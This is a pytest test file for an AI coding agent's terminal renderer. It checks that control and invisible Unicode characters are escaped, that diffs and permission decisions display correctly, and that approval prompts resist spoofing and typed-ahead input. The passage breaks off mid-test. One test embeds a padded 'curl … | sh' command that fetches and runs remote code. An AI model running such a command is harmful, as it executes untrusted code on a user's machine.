"""Tests for nanoclaude.cli.render: what the agent does, made readable and made safe.

The confirmation prompt is the one piece of UI that has to be right, and everything a
person reads here is either text this code wrote or text somebody else did. The sweeps
below (``HOOKS``) feed every method that prints outside text the same hostile strings,
so that a new method cannot print one unguarded and still pass.
"""

from __future__ import annotations

import asyncio
import io
import re
import unicodedata
from collections.abc import Awaitable, Callable
from dataclasses import replace
from datetime import date, timedelta
from pathlib import Path

import pytest
from prompt_toolkit.input import create_pipe_input
from prompt_toolkit.output import DummyOutput
from rich.console import Console

from nanoclaude.agent.router import Router
from nanoclaude.agent.ui import UI, Approval
from nanoclaude.cli import render
from nanoclaude.cli.prompt import build_prompt_session, new_prompter
from nanoclaude.cli.render import (
    ConsoleUI,
    cost_panel,
    render_diff,
    render_markdown,
    show_error,
    status_panel,
    summarise_call,
    visible,
)
from nanoclaude.config.schema import Config, ModelConfig, RolesConfig
from nanoclaude.conversation.transcript import TextBlock, ToolUseBlock
from nanoclaude.permissions.policy import (
    Decision,
    PermissionMode,
    PermissionRequest,
    PermissionResult,
)
from nanoclaude.providers.base import ModelReply, StopKind, Usage
from nanoclaude.providers.capabilities import CapabilityCache
from nanoclaude.providers.pricing import Price, PriceBook
from nanoclaude.testing.scripted import calls, says
from nanoclaude.testing.session import build_session
from nanoclaude.tools.base import ToolArgumentError, ToolOutcome
from tests.cli.helpers import (
    ASK,
    ScriptedPrompter,
    capture,
    colour_codes,
    edit_call,
    plain_console,
    sgr_parameters,
    stray_escapes,
    styled_pieces,
    terminal_console,
    unstyled,
    write_request,
)
from tests.fifo import call_without_blocking, make_fifo

ALLOW = PermissionResult(Decision.ALLOW, "rule.allow", "allowed")


class Screen:
    """A ConsoleUI on a plain console, with the text it has written so far."""

    def __init__(
        self,
        *answers: str | BaseException,
        auto_approve: bool = False,
        width: int = 100,
        root: str | None = None,
    ) -> None:
        self.console, self._buffer = plain_console(width)
        self.prompter = ScriptedPrompter(*answers)
        self.ui = ConsoleUI(
            self.console, auto_approve=auto_approve, prompter=self.prompter, root=root
        )

    @property
    def text(self) -> str:
        return self._buffer.getvalue()


def reply(text: str) -> ModelReply:
    return ModelReply((TextBlock(text),), StopKind.END_TURN, Usage(), "scripted")


def row(text: str, label: str) -> str:
    """The line of a table whose first cell is ``label``."""
    for line in text.splitlines():
        if re.match(rf"\W*{re.escape(label)}(\W|$)", line):
            return line
    raise AssertionError(f"no row labelled {label!r} in:\n{text}")


# --------------------------------------------------------------------------
# Control characters are shown, never acted on
# --------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("raw", "shown"),
    [
        ("a\x1b[2Kb", r"a\x1b[2Kb"),
        ("a\rb", r"a\rb"),
        ("a\nb", r"a\nb"),
        ("a\tb", r"a\tb"),
        ("a\x00b", r"a\x00b"),
        ("a\x07b", r"a\x07b"),
        ("a\x7fb", r"a\x7fb"),
        ("a\x9bb", r"a\x9bb"),
        ("a\N{RIGHT-TO-LEFT OVERRIDE}b", "a\\u202eb"),
        ("a\N{LEFT-TO-RIGHT EMBEDDING}b", "a\\u202ab"),
        ("a\N{LEFT-TO-RIGHT ISOLATE}b", "a\\u2066b"),
        ("a\N{POP DIRECTIONAL ISOLATE}b", "a\\u2069b"),
        ("a\x9fb", "a\\x9fb"),
        # Just outside the ranges: ordinary text, and not shown as escapes.
        ("a\N{NO-BREAK SPACE}b", "a\N{NO-BREAK SPACE}b"),
        ("a\N{NARROW NO-BREAK SPACE}b", "a\N{NARROW NO-BREAK SPACE}b"),
        ("a\N{GRINNING FACE}b", "a\N{GRINNING FACE}b"),
        ("a\N{IDEOGRAPHIC SPACE}b", "a\N{IDEOGRAPHIC SPACE}b"),
        # Category Cf, "format": invisible, so two subjects that differ by one print alike.
        ("a\N{LEFT-TO-RIGHT MARK}b", "a\\u200eb"),
        ("a\N{RIGHT-TO-LEFT MARK}b", "a\\u200fb"),
        ("a\N{ZERO WIDTH SPACE}b", "a\\u200bb"),
        ("a\N{ZERO WIDTH NON-JOINER}b", "a\\u200cb"),
        ("a\N{ZERO WIDTH JOINER}b", "a\\u200db"),
        ("a\N{WORD JOINER}b", "a\\u2060b"),
        ("a\N{ZERO WIDTH NO-BREAK SPACE}b", "a\\ufeffb"),
        ("a\N{SOFT HYPHEN}b", "a\\xadb"),
        ("a\N{ARABIC NUMBER SIGN}b", "a\\u0600b"),
        ("a\N{LANGUAGE TAG}b", "a\\U000e0001b"),
        ("a\N{MUSICAL SYMBOL BEGIN BEAM}b", "a\\U0001d173b"),
        # A lone surrogate cannot be printed at all.
        ("a" + chr(0xD800) + "b", "a\\ud800b"),
        (
            "caf\N{LATIN SMALL LETTER E WITH ACUTE} \N{GREEK SMALL LETTER LAMDA}",
            "caf\N{LATIN SMALL LETTER E WITH ACUTE} \N{GREEK SMALL LETTER LAMDA}",
        ),
        ("plain [id] text", "plain [id] text"),
        # Text that merely looks like an escape is left as it is: only the real thing is changed.
        (r"a\x1b", r"a\x1b"),
    ],
)
def test_every_control_character_is_shown_as_the_escape_that_names_it(raw, shown):
    assert visible(raw) == shown


def test_a_text_that_spans_lines_can_keep_its_line_breaks_and_tabs():
    assert visible("a\n\tb\x1bc", keep_newlines=True) == "a\n\tb\\x1bc"


# --------------------------------------------------------------------------
# Summaries
# --------------------------------------------------------------------------


def test_a_call_is_summarised_by_its_most_informative_argument():
    assert summarise_call(ToolUseBlock("t1", "Read", {"path": "a.py"})) == "a.py"
    assert summarise_call(ToolUseBlock("t2", "Bash", {"command": "npm test"})) == "npm test"
    assert summarise_call(ToolUseBlock("t3", "Grep", {"pattern": "TODO"})) == "TODO"
    assert summarise_call(ToolUseBlock("t4", "Git", {"subcommand": "status"})) == "status"
    assert summarise_call(ToolUseBlock("t5", "Odd", {"b": 1, "a": 2})) == "a, b"
    assert summarise_call(ToolUseBlock("t6", "Read", {"path": 123})) == "123"
    assert summarise_call(ToolUseBlock("t7", "Odd", {})) == ""


def test_a_long_summary_is_shortened():
    call = ToolUseBlock("t1", "Bash", {"command": "x" * 500})
    assert summarise_call(call) == "x" * 97 + "..."


def test_a_summary_shows_control_characters_instead_of_acting_on_them():
    call = ToolUseBlock("t1", "Read", {"path": "a\x1b[2K\rb"})
    assert summarise_call(call) == r"a\x1b[2K\rb"


# --------------------------------------------------------------------------
# Diffs and prose
# --------------------------------------------------------------------------


def test_a_diff_is_rendered_with_both_sides_visible():
    diff = "--- a/x.py\n+++ b/x.py\n@@ -1 +1 @@\n-old\n+new\n"
    text = capture(render_diff(diff))
    assert "-old" in text and "+new" in text


DIFF_OF = "--- a/f\n+++ b/f\n@@ -1 +1 @@\n-old\n+new {}\n"


def test_a_real_escape_in_a_diff_is_set_apart_from_the_four_characters_that_spell_one():
    real = styled_pieces(render_diff(DIFF_OF.format("\x1b")))
    spelled = styled_pieces(render_diff(DIFF_OF.format("\\x1b")))
    assert [style.reverse for text, style in real if text == "\\x1b"] == [True]
    assert not any(style.reverse for _, style in spelled)


def test_a_diff_is_coloured_by_the_kind_of_each_line():
    pieces = styled_pieces(render_diff(DIFF_OF.format("x")))
    colour_of = {text: style.color.name for text, style in pieces if style.color}
    assert colour_of["-old"] == "red" and colour_of["+new x"] == "green"
    assert colour_of["@@ -1 +1 @@"] == "cyan"
    # A line that begins with "--" inside a hunk is a removed line and not a file header.
    inside = "--- a/f\n+++ b/f\n@@ -1 +1 @@\n--- a removed line\n+++ an added line\n"
    pieces = styled_pieces(render_diff(inside))
    colour_of = {text: style.color.name for text, style in pieces if style.color}
    assert colour_of["--- a removed line"] == "red" and colour_of["+++ an added line"] == "green"


def test_a_diff_line_wider_than_two_hundred_characters_is_cut_and_says_how_much_is_left():
    diff = f"--- a/f\n+++ b/f\n@@ -1 +1 @@\n-old\n+{'y' * 200_000}\n"
    shown = capture(render_diff(diff), width=1000).splitlines()
    assert shown[-2:] == ["-old", "+" + "y" * 199 + "... (199801 more characters)"]


def test_a_diff_line_is_cut_only_where_it_is_wider_than_two_hundred_characters():
    exact = "+" + "y" * 199
    one_over = "+" + "y" * 200
    diff = f"--- a/f\n+++ b/f\n@@ -1 +1,2 @@\n{exact}\n{one_over}\n"
    assert capture(render_diff(diff), width=1000).splitlines()[-2:] == [
        exact,
        exact + "... (1 more character)",
    ]


def test_the_note_on_a_cut_diff_line_is_drawn_dim_apart_from_the_line_it_ends():
    diff = f"--- a/f\n+++ b/f\n@@ -1 +1 @@\n-old\n+{'y' * 300}\n"
    pieces = styled_pieces(render_diff(diff), width=1000)
    note = [style for text, style in pieces if text == "... (101 more characters)"]
    assert [style.dim for style in note] == [True]
    assert [style.color for style in note] == [None]  # the line's colour ends with the line
    colour_of = {text: style.color.name for text, style in pieces if style.color}
    assert colour_of["+" + "y" * 199] == "green"


def test_the_mark_for_a_missing_final_newline_is_drawn_dim():
    diff = "--- a/f\n+++ b/f\n@@ -1 +1 @@\n-x\n\\ No newline at end of file\n+y\n"
    pieces = styled_pieces(render_diff(diff))
    assert [s.dim for t, s in pieces if t == "\\ No newline at end of file"] == [True]


async def test_the_preview_of_a_file_without_a_final_newline_does_not_run_two_lines_together(
    tmp_repo,
):
    target = tmp_repo / "a.py"
    target.write_text("x = 1")
    screen = Screen("n", width=300)
    await screen.ui.confirm(edit_call("a.py", "1", "2"), write_request("Edit", str(target)), ASK)
    assert screen.text.splitlines()[-4:] == [
        "-x = 1",
        "\\ No newline at end of file",
        "+x = 2",
        "\\ No newline at end of file",
    ]


async def test_the_preview_sets_a_real_escape_apart_from_the_text_that_spells_one(tmp_repo):
    target = tmp_repo / "a.py"
    target.write_text("x = 1\n")
    shown = {}
    for label, new in (("real", "x = '\x1b'"), ("spelled", "x = '\\x1b'")):
        console, buffer = terminal_console(200)
        ui = ConsoleUI(console, prompter=ScriptedPrompter("n"))
        await ui.confirm(edit_call("a.py", "x = 1", new), write_request("Edit", str(target)), ASK)
        shown[label] = buffer.getvalue()
    assert "7" in sgr_parameters(shown["real"])  # reverse video
    assert "7" not in sgr_parameters(shown["spelled"])


def test_model_prose_is_rendered_as_markdown_and_not_as_markup():
    text = capture(render_markdown("**bold** arr[0] [/] [bold]x[/bold]\n\n```py\nprint('hi')\n```"))
    assert "bold arr[0] [/] [bold]x[/bold]" in text
    assert "**" not in text and "print('hi')" in text


def test_a_link_in_model_prose_shows_where_it_goes():
    # A terminal hyperlink hides its destination behind its label, and the label is the
    # model's to choose. The destination is printed beside it.
    text = capture(render_markdown("[the docs](https://example.org/x)"))
    assert "the docs" in text and "https://example.org/x" in text


# --------------------------------------------------------------------------
# What a decision looks like
# --------------------------------------------------------------------------


def test_a_refusal_is_shown_with_its_rule_id():
    screen = Screen()
    result = PermissionResult(
        Decision.DENY, "sandbox.outside-root", "/etc/passwd is outside /home/me/proj"
    )
    screen.ui.on_decision(
        ToolUseBlock("t1", "Read", {"path": "/etc/passwd"}),
        PermissionRequest("Read", "/etc/passwd"),
        result,
    )
    # Spec 17.9, character for character: no "Refused" in the model-facing casing, and the
    # reason that says what was wrong, not only the rule that fired.
    assert screen.text == "refused (sandbox.outside-root): /etc/passwd is outside /home/me/proj\n"


def test_an_allowed_call_is_one_collapsed_line():
    screen = Screen()
    call = ToolUseBlock("t1", "Read", {"path": "src/a.py"})
    screen.ui.on_decision(call, PermissionRequest("Read", "/repo/src/a.py"), ALLOW)
    assert screen.text == "Read src/a.py\n"


def test_a_call_that_is_about_to_be_asked_about_is_not_announced_first():
    screen = Screen()
    call = ToolUseBlock("t1", "Bash", {"command": "make"})
    screen.ui.on_decision(call, PermissionRequest("Bash", "make"), ASK)
    assert screen.text == ""


def test_an_allowed_write_is_announced_by_the_path_it_will_write_relative_to_the_root():
    screen = Screen(root="/repo")
    call = ToolUseBlock("t1", "Write", {"path": "src/a.py", "content": "x"})
    screen.ui.on_decision(call, write_request("Write", "/repo/src/a.py"), ALLOW)
    assert screen.text == "Write src/a.py\n"


def test_an_allowed_write_says_what_the_model_called_the_path_when_that_is_not_the_path():
    screen = Screen(root="/repo")
    call = ToolUseBlock("t1", "Write", {"path": "link/../src/a.py\r", "content": "x"})
    screen.ui.on_decision(call, write_request("Write", "/repo/src/a.py"), ALLOW)
    assert screen.text == "Write src/a.py (called with link/../src/a.py\\r)\n"


def test_an_allowed_write_outside_the_root_is_announced_whole():
    screen = Screen(root="/repo")
    call = ToolUseBlock("t1", "Write", {"path": "/shared/lib/b.py", "content": "x"})
    screen.ui.on_decision(call, write_request("Write", "/shared/lib/b.py"), ALLOW)
    assert screen.text == "Write /shared/lib/b.py\n"


def test_a_root_given_through_a_link_is_resolved_as_the_paths_of_a_request_are(tmp_path):
    # A request's paths are resolved, so a root that is not would never contain any of them.
    real = tmp_path / "real"
    real.mkdir()
    link = tmp_path / "link"
    link.symlink_to(real)
    screen = Screen(root=str(link))
    call = ToolUseBlock("t1", "Write", {"path": "a.py", "content": "x"})
    screen.ui.on_decision(call, write_request("Write", str(real / "a.py")), ALLOW)
    assert screen.text == "Write a.py\n"


def test_a_root_is_not_a_prefix_of_a_sibling_directory():
    # /repo is not the root of /repo-old/a.py, whatever the strings share.
    screen = Screen(root="/repo")
    call = ToolUseBlock("t1", "Write", {"path": "/repo-old/a.py", "content": "x"})
    screen.ui.on_decision(call, write_request("Write", "/repo-old/a.py"), ALLOW)
    assert screen.text == "Write /repo-old/a.py\n"


def test_without_a_root_an_allowed_write_is_announced_by_its_resolved_path():
    screen = Screen()
    call = ToolUseBlock("t1", "Write", {"path": "src/a.py", "content": "x"})
    screen.ui.on_decision(call, write_request("Write", "/repo/src/a.py"), ALLOW)
    assert screen.text == "Write /repo/src/a.py (called with src/a.py)\n"


def test_an_allowed_read_is_still_announced_by_what_the_model_asked_for():
    screen = Screen(root="/repo")
    call = ToolUseBlock("t1", "Read", {"path": "link/a.py"})
    screen.ui.on_decision(
        call, PermissionRequest("Read", "/repo/real/a.py", ("/repo/real/a.py",)), ALLOW
    )
    assert screen.text == "Read link/a.py\n"


async def test_an_allowed_write_through_a_link_is_announced_by_the_file_it_writes(tmp_repo):
    (tmp_repo / "real_dir").mkdir()
    (tmp_repo / "linkdir").symlink_to("real_dir")
    console, buffer = plain_console(300)
    ui = ConsoleUI(console, root=str(tmp_repo))
    script = [calls("Write", {"path": "linkdir/new.txt", "content": "x\n"}, call_id="w1")]
    session = build_session(tmp_repo, [*script, says("done")], ui=ui)
    session.policy = replace(session.policy, mode=PermissionMode.ACCEPT_EDITS)
    session.executor.policy = session.policy
    await session.follow_up("write it")
    assert "Write real_dir/new.txt (called with linkdir/new.txt)\n" in buffer.getvalue()
    assert (tmp_repo / "real_dir" / "new.txt").read_text() == "x\n"


async def test_a_write_through_a_link_is_announced_by_its_file_when_everything_is_approved(
    tmp_repo,
):
    # The same call as above, announced by the confirmation and not by the decision: nothing
    # is asked when everything is approved, so the confirmation is where the call is named.
    (tmp_repo / "real_dir").mkdir()
    (tmp_repo / "linkdir").symlink_to("real_dir")
    console, buffer = plain_console(300)
    ui = ConsoleUI(console, auto_approve=True, root=str(tmp_repo))
    script = [calls("Write", {"path": "linkdir/new.txt", "content": "x\n"}, call_id="w1")]
    session = build_session(tmp_repo, [*script, says("done")], ui=ui)
    await session.follow_up("write it")
    announced = buffer.getvalue().splitlines()
    assert announced.count("Write real_dir/new.txt (called with linkdir/new.txt)") == 1
    assert [line for line in announced if line.startswith("Write")] == announced[:1]
    assert (tmp_repo / "real_dir" / "new.txt").read_text() == "x\n"


def test_an_allowed_write_to_a_path_holding_controls_names_them_on_its_line():
    console, buffer = terminal_console(300)
    ui = ConsoleUI(console, root="/repo")
    call = ToolUseBlock("t1", "Write", {"path": "a\x1b[2J.py", "content": "x"})
    ui.on_decision(call, write_request("Write", "/repo/a\x1b[2J.py"), ALLOW)
    output = buffer.getvalue()
    assert stray_escapes(output) == []
    assert unstyled(output) == "Write a\\x1b[2J.py\n"


async def test_a_confirmation_names_the_path_relative_to_the_root_when_it_knows_the_root(tmp_repo):
    target = tmp_repo / "src" / "a.py"
    target.parent.mkdir()
    target.write_text("x = 1\n")
    screen = Screen("n", width=300, root=str(tmp_repo))
    await screen.ui.confirm(
        edit_call("src/a.py", "x = 1", "x = 2"), write_request("Edit", str(target)), ASK
    )
    assert screen.text.splitlines()[1] == "Edit  src/a.py"
    assert "called with" not in screen.text


def test_a_failed_call_shows_the_first_line_of_what_went_wrong():
    screen = Screen()
    call = ToolUseBlock("t1", "Read", {"path": "a.py"})
    screen.ui.on_outcome(call, ToolOutcome("t1", "a.py does not exist\nsecond line", is_error=True))
    assert screen.text == "  ! a.py does not exist\n"


def test_a_call_that_worked_adds_nothing_to_its_collapsed_line():
    screen = Screen()
    call = ToolUseBlock("t1", "Read", {"path": "a.py"})
    screen.ui.on_outcome(call, ToolOutcome("t1", "     1\tx = 1\n"))
    assert screen.text == ""


APPLIED = "Edited a.py\n--- a/a.py\n+++ b/a.py\n@@ -1 +1 @@\n-x = 1\n+x = 2\n"


def test_an_edit_nobody_was_asked_about_is_shown_as_a_diff_once_it_is_applied():
    screen = Screen()
    screen.ui.on_outcome(edit_call("a.py", "x = 1", "x = 2"), ToolOutcome("e1", APPLIED))
    assert "-x = 1" in screen.text and "+x = 2" in screen.text
    assert "Edited" not in screen.text


def test_the_task_list_the_model_keeps_is_shown_as_the_tool_wrote_it():
    # TodoWrite exists so that the person can see what the model thinks it is doing. Its
    # check boxes are brackets, which rich would take for tags and drop.
    screen = Screen()
    call = ToolUseBlock("t1", "TodoWrite", {"todos": []})
    listing = "1/3 complete\n[x] read the parser\n[>] fix the bug\n[ ] run the tests"
    screen.ui.on_outcome(call, ToolOutcome("t1", listing))
    assert screen.text == listing + "\n"


def test_a_task_list_that_was_refused_shows_its_error_like_any_other_call():
    screen = Screen()
    call = ToolUseBlock("t1", "TodoWrite", {"todos": []})
    screen.ui.on_outcome(call, ToolOutcome("t1", "todos must be a list", is_error=True))
    assert screen.text == "  ! todos must be a list\n"


def test_the_reply_is_shown_as_markdown():
    screen = Screen()
    screen.ui.on_reply(reply("  **Done.** Two files changed.  "))
    assert screen.text.strip() == "Done. Two files changed."


def test_a_reply_that_says_nothing_prints_nothing():
    screen = Screen()
    screen.ui.on_reply(reply("   \n"))
    assert screen.text == ""


def test_a_long_retry_reason_is_cut_at_eighty_characters():
    screen = Screen(width=300)
    screen.ui.on_retry(1, 2.0, "x" * 200)
    assert screen.text == "provider busy, retry 1 in 2.0s " + "x" * 80 + "\n"


def test_the_retry_reason_is_cleaned_before_it_is_cut_and_not_after():
    # Cut first and the escape sequence would use up part of the eighty.
    screen = Screen(width=300)
    screen.ui.on_retry(1, 2.0, "\x1b[2J" + "y" * 100)
    assert screen.text == "provider busy, retry 1 in 2.0s " + "y" * 80 + "\n"


def test_a_retry_says_how_long_it_will_wait_and_why():
    screen = Screen()
    screen.ui.on_retry(2, 1.5, "overloaded_error")
    assert screen.text == "provider busy, retry 2 in 1.5s overloaded_error\n"


def test_an_error_line_carries_the_prefix_once_whether_or_not_it_was_given(tmp_path):
    console, buffer = plain_console()
    show_error(console, "no such model \u2014 choose another")
    show_error(console, "error: no such model \u2014 choose another")
    assert buffer.getvalue() == "error: no such model \u2014 choose another\n" * 2


def test_an_error_line_is_one_line_whatever_the_message_holds(tmp_path):
    # Every caller of show_error gets this, not only the ones that describe an exception.
    console, buffer = plain_console()
    show_error(console, "bad value\nerror: second\n\n  third")
    assert buffer.getvalue() == "error: bad value error: second third\n"


def test_an_error_line_does_not_end_in_a_blank_that_a_trailing_line_break_leaves(tmp_path):
    console, buffer = plain_console()
    show_error(console, "ends with a break\n")
    assert buffer.getvalue() == "error: ends with a break\n"


def test_an_error_line_keeps_the_spacing_inside_what_it_quotes(tmp_path):
    # Only the line breaks go: "a  b" quoted from a path or a name is not "a b".
    console, buffer = plain_console()
    show_error(console, "no model named 'a  b' \u2014 choose one of: x")
    assert buffer.getvalue() == "error: no model named 'a  b' \u2014 choose one of: x\n"


# --------------------------------------------------------------------------
# The confirmation
# --------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("answer", "approval"),
    [
        ("y", Approval.ONCE),
        ("Y", Approval.ONCE),
        (" yes ", Approval.ONCE),
        ("a", Approval.ALWAYS),
        ("always", Approval.ALWAYS),
        ("n", Approval.NO),
        ("no", Approval.NO),
        ("", Approval.NO),
    ],
)
async def test_the_answer_decides_the_approval(answer, approval):
    screen = Screen(answer)
    call = ToolUseBlock("t1", "Bash", {"command": "make"})
    assert await screen.ui.confirm(call, PermissionRequest("Bash", "make"), ASK) is approval


async def test_an_answer_nobody_recognises_is_asked_again_rather_than_taken_for_a_yes():
    screen = Screen("maybe", "y")
    call = ToolUseBlock("t1", "Bash", {"command": "make"})
    approval = await screen.ui.confirm(call, PermissionRequest("Bash", "make"), ASK)
    assert approval is Approval.ONCE
    assert len(screen.prompter.asked) == 2
    assert "y, n or a" in screen.text


async def test_no_answer_at_all_is_a_no():
    screen = Screen(EOFError())
    call = ToolUseBlock("t1", "Bash", {"command": "make"})
    assert await screen.ui.confirm(call, PermissionRequest("Bash", "make"), ASK) is Approval.NO


async def test_ctrl_c_at_a_confirmation_cancels_the_turn_it_belongs_to():
    # Not a no: a no goes back to the model, which answers it and costs another round.
    # Ctrl+C means "stop", and a prompt that raised KeyboardInterrupt inside the turn's
    # task would take the whole event loop down with it.
    screen = Screen(KeyboardInterrupt())
    call = ToolUseBlock("t1", "Bash", {"command": "make"})
    with pytest.raises(asyncio.CancelledError):
        await screen.ui.confirm(call, PermissionRequest("Bash", "make"), ASK)


@pytest.mark.parametrize(
    ("keys", "outcome"),
    [("\x03", "cancelled"), ("\x04", "no"), ("y\r", "once"), ("a\r", "always"), ("\r", "no")],
)
async def test_the_confirmation_at_a_real_prompt_reads_each_key_as_it_should(keys, outcome):
    # The prompt is prompt_toolkit's, fed through a pipe: what the keys do is its doing and
    # what the confirmation makes of them is ours. Ctrl+C is the cancellation of the turn.
    with create_pipe_input() as keyboard:
        console, _ = plain_console()
        ui = ConsoleUI(console, prompter=new_prompter(input=keyboard, output=DummyOutput()))
        call = ToolUseBlock("t1", "Bash", {"command": "make"})
        keyboard.send_text(keys)
        if outcome == "cancelled":
            with pytest.raises(asyncio.CancelledError):
                await ui.confirm(call, PermissionRequest("Bash", "make"), ASK)
            return
        approval = await ui.confirm(call, PermissionRequest("Bash", "make"), ASK)
        assert (
            approval
            is {"once": Approval.ONCE, "always": Approval.ALWAYS, "no": Approval.NO}[outcome]
        )


async def test_what_the_prompt_had_already_read_cannot_answer_the_next_question():
    # prompt_toolkit reads what is waiting in one chunk and keeps what the prompt did not use
    # for the next prompt. A person who types "y", Enter, "y", Enter ahead of two questions
    # has answered the first, and the second must wait for them: it has not been asked yet.
    with create_pipe_input() as keyboard:
        console, _ = plain_console()
        ui = ConsoleUI(console, prompter=new_prompter(input=keyboard, output=DummyOutput()))
        call = ToolUseBlock("t1", "Bash", {"command": "make"})
        request = PermissionRequest("Bash", "make")
        keyboard.send_text("y\ry\r")
        assert await ui.confirm(call, request, ASK) is Approval.ONCE
        with pytest.raises(TimeoutError):
            await asyncio.wait_for(ui.confirm(call, request, ASK), 0.5)


async def test_what_the_repl_prompt_left_behind_cannot_answer_a_question(tmp_path):
    # The case that matters: "go", Enter, "y", Enter arrive in one chunk at the prompt the person
    # types their request into. The request is taken, the "y" and Enter are not, and the question
    # the request leads to must not be answered by them. The two prompts share one input.
    with create_pipe_input() as keyboard:
        console, _ = plain_console()
        repl_prompt = build_prompt_session(str(tmp_path), input=keyboard, output=DummyOutput())
        ui = ConsoleUI(console, prompter=new_prompter(input=keyboard, output=DummyOutput()))
        keyboard.send_text("go\ry\r")
        assert await repl_prompt.prompt_async("> ") == "go"
        call = ToolUseBlock("t1", "Bash", {"command": "make"})
        with pytest.raises(TimeoutError):
            await asyncio.wait_for(ui.confirm(call, PermissionRequest("Bash", "make"), ASK), 0.5)


async def test_nothing_is_asked_when_everything_is_approved():
    screen = Screen(auto_approve=True)
    call = ToolUseBlock("t1", "Bash", {"command": "make"})
    assert await screen.ui.confirm(call, PermissionRequest("Bash", "make"), ASK) is Approval.ONCE
    assert screen.prompter.asked == []
    # The confirmation is the one place a call that was asked about is named: on_decision
    # stays quiet for it, because the question names it. Under auto-approve the question is
    # not asked, so the confirmation names the call itself, and does not say it twice.
    assert screen.text == "Bash make\n"


async def test_a_call_that_is_asked_about_is_announced_once_when_everything_is_approved(tmp_repo):
    # Through the real executor, which tells the UI of the decision and then asks.
    console, buffer = plain_console(300)
    ui = ConsoleUI(console, auto_approve=True, root=str(tmp_repo))
    script = [calls("Write", {"path": "new.txt", "content": "x\n"}, call_id="w1"), says("done")]
    session = build_session(tmp_repo, script, ui=ui)
    await session.follow_up("write it")
    assert buffer.getvalue().count("Write new.txt") == 1
    assert (tmp_repo / "new.txt").read_text() == "x\n"


def recording_ui(*answers: str, auto_approve: bool = False) -> tuple[ConsoleUI, list[str]]:
    """A ConsoleUI that records, in one list, when input is discarded, when the prompt is told
    to forget what it kept, and when a question is asked."""
    events: list[str] = []
    console, _ = plain_console()
    prompter = ScriptedPrompter(
        *answers,
        on_ask=lambda _message: events.append("ask"),
        on_forget=lambda: events.append("forget"),
    )
    ui = ConsoleUI(
        console,
        auto_approve=auto_approve,
        prompter=prompter,
        discard_input=lambda: events.append("discard"),
    )
    return ui, events


def cleared_then_asked(events: list[str]) -> bool:
    """Each ask is preceded by both clears, in either order, and by nothing else."""
    groups = [events[i : i + 3] for i in range(0, len(events), 3)]
    return len(events) % 3 == 0 and all(
        sorted(group[:2]) == ["discard", "forget"] and group[2] == "ask" for group in groups
    )


async def test_what_was_typed_before_a_question_is_discarded_before_it_is_asked():
    # A person who types "y" and Enter while the model is still thinking has not answered a
    # question nobody had asked yet. It would otherwise be read as the answer, and approve a
    # write they never saw. Some of it is still in the terminal and some the prompt has read.
    ui, events = recording_ui("n")
    call = ToolUseBlock("t1", "Bash", {"command": "make"})
    await ui.confirm(call, PermissionRequest("Bash", "make"), ASK)
    assert len(events) == 3 and cleared_then_asked(events)


async def test_input_is_discarded_before_a_question_asked_again_too():
    ui, events = recording_ui("maybe", "y")
    call = ToolUseBlock("t1", "Bash", {"command": "make"})
    await ui.confirm(call, PermissionRequest("Bash", "make"), ASK)
    assert len(events) == 6 and cleared_then_asked(events)


class Stream(io.StringIO):
    """What a console writes to, noting each write in the list the test's other events go in."""

    def __init__(self, events: list[str]) -> None:
        super().__init__()
        self._events = events

    def write(self, text: str) -> int:
        if text:
            self._events.append("print")
        return super().write(text)


@pytest.mark.parametrize("tool", ["Edit", "Write"])
async def test_input_is_discarded_after_the_preview_is_on_the_screen_and_just_before_the_prompt(
    tool, tmp_repo
):
    # The preview reads a file and builds a diff, and that is the time a person has to type
    # ahead. What is typed then is what the discard is for, so it comes after the preview.
    target = tmp_repo / "a.py"
    target.write_text("x = 1\n")
    events: list[str] = []
    stream = Stream(events)
    console = Console(file=stream, width=300, no_color=True, force_terminal=False)
    on_screen: dict[str, str] = {}

    def mark(event: str) -> None:
        events.append(event)
        on_screen[event] = stream.getvalue()

    prompter = ScriptedPrompter(
        "n", on_ask=lambda _message: mark("ask"), on_forget=lambda: mark("forget")
    )
    ui = ConsoleUI(console, prompter=prompter, discard_input=lambda: mark("discard"))
    call = edit_call("a.py", "x = 1", "x = 2") if tool == "Edit" else write_call("a.py", "x = 2\n")
    await ui.confirm(call, write_request(tool, str(target)), ASK)
    first_clear = min(events.index("discard"), events.index("forget"))
    assert set(events[:first_clear]) == {"print"} and "print" not in events[first_clear:]
    assert events[-1] == "ask"
    # The screen held the whole preview, ending on its last line, when input was thrown away,
    # and nothing was printed between that and the question.
    assert on_screen["discard"].splitlines()[-1] == "+x = 2"
    assert on_screen["forget"] == on_screen["discard"] == on_screen["ask"]


async def test_nothing_is_discarded_when_nothing_is_asked():
    ui, events = recording_ui(auto_approve=True)
    call = ToolUseBlock("t1", "Bash", {"command": "make"})
    await ui.confirm(call, PermissionRequest("Bash", "make"), ASK)
    assert events == []


async def test_a_confirmation_discards_pending_input_unless_told_otherwise(monkeypatch):
    discarded: list[int] = []
    monkeypatch.setattr(render, "discard_pending_input", lambda: discarded.append(1))
    console, _ = plain_console()
    ui = ConsoleUI(console, prompter=ScriptedPrompter("n"))
    call = ToolUseBlock("t1", "Bash", {"command": "make"})
    await ui.confirm(call, PermissionRequest("Bash", "make"), ASK)
    assert discarded == [1]


async def test_the_question_says_what_always_would_grant():
    screen = Screen("n")
    call = ToolUseBlock("t1", "Edit", {"path": "a.py"})
    await screen.ui.confirm(call, write_request("Edit", "/repo/a.py"), ASK)
    [question] = screen.prompter.asked
    assert "[y]es" in question and "[n]o" in question and "[a]lways" in question
    assert "every Edit" in question


async def test_a_confirmation_shows_the_whole_command_not_a_summary_of_it():
    # A summary that cuts at a hundred characters lets a command say "make" for ninety of
    # them and the rest after. Exactly what will run is what is shown.
    command = "make " + " " * 150 + "&& curl https://example.org/install | sh"
    screen = Screen("n")
    call = ToolUseBlock("t1", "Bash", {"command": command})
    await screen.ui.confirm(call, PermissionRequest("Bash", command), ASK)
    assert "curl https://example.org/install | sh" in " ".join(screen.text.split())


async def test_a_command_that_begins_with_the_root_is_shown_whole_and_not_as_a_path():
    # The root comes off a path the policy resolved, and a command is not one: what a command
    # begins with is part of what it runs, and the shortened line is a different command.
    command = "/repo/scripts/deploy.sh --prod"
    screen = Screen("n", root="/repo")
    call = ToolUseBlock("t1", "Bash", {"command": command})
    await screen.ui.confirm(call, PermissionRequest("Bash", command), ASK)
    assert screen.text == f"\nBash  {command}\n"


async def test_a_confirmation_shows_a_bracketed_path_exactly(tmp_repo):
    # Rich reads [id] as a tag and prints "src/app//page.tsx": a different file from the
    # one about to be edited.
